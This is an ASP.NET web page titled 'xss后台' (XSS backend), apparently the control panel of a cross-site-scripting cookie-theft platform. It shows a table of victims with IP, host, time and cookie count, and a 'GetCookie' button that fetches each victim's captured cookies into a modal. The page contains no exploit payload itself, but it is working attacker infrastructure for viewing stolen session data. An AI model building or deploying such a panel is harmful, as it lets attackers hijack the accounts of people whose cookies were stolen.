<%@ Page Language="C#" AutoEventWireup="true" CodeFile="gride.aspx.cs" Inherits="gride" %>

<!DOCTYPE html>

<html xmlns="http://www.w3.org/1999/xhtml">
<head runat="server">
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
    <title>xss后台</title>
    <link href="/css/bootstrap.min.css" rel="stylesheet" />
    <script src="/js/jquery-1.11.1.min.js"></script>
    <script src="/js/bootstrap.min.js"></script>
    <style>
        table {
            width: 100%;
        }

        th {
        }

        tr td, tr th {
            height: 40px;
            line-height: 40px;
            padding-left:20px;
        }
    </style>
</head>
<body>
    <form id="form1" runat="server"></form>
    <table class="table-striped table-hover">
        <tr>
            <th>#</th>
            <th>IP</th>
            <th>Host</th>
            <th>Time</th>
            <th>CookieCount</th>
            <th>Control</th>
            <!--th>LocalCount</th-->
        </tr>
        <asp:Repeater ID="rptUserInfo" runat="server">
            <ItemTemplate>
                <tr>
                    <td><%# Eval("id") %></td>
                    <td><%# Eval("ip") %></td>
                    <td><%# Eval("userhostname") %></td>
                    <td><%# ((DateTime)Eval("requesttime")).ToString("yyyy-MM-dd HH:mm:ss") %></td>
                    <td><%# Eval("cookiscount") %></td>
                    <td><a href="###" class="btn_checkCookie btn btn-primary" data-toggle="modal" data-target="#myModal" detailid="<%#Eval("id") %>">GetCookie</a></td>
                    <!--td><%# Eval("localstrongcount") %></td-->
                </tr>
            </ItemTemplate>
        </asp:Repeater>
    </table>


    <!-- Modal -->
    <div class="modal fade" id="myModal" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true" >
        <div class="modal-dialog" style="width:800px;overflow:hidden;">
            <div class="modal-content">
                <div class="modal-header">
                    <button type="button" class="close" data-dismiss="modal" aria-hidden="true">&times;</button>
                    <h4 class="modal-title" id="myModalLabel">Modal title</h4>
                </div>
                <div class="modal-body">
                    ...
                </div>
                <div class="modal-footer">
                    <button type="button" class="btn btn-default" data-dismiss="modal">Close</button>
                </div>
            </div>
            <!-- /.modal-content -->
        </div>
        <!-- /.modal-dialog -->
    </div>
    <!-- /.modal -->

    <script>
        $(function () {
            $(".btn_checkCookie").click(function () {
                var id = $(this).attr("detailId");

                $("#myModalLabel").html("InfoID: " + id);

                $.get("/frame/cookieInfo.aspx?id=" + id, function (data) {
                    $(".modal-body").html(data);
                });

            });
        });
    </script>
</body>
</html>
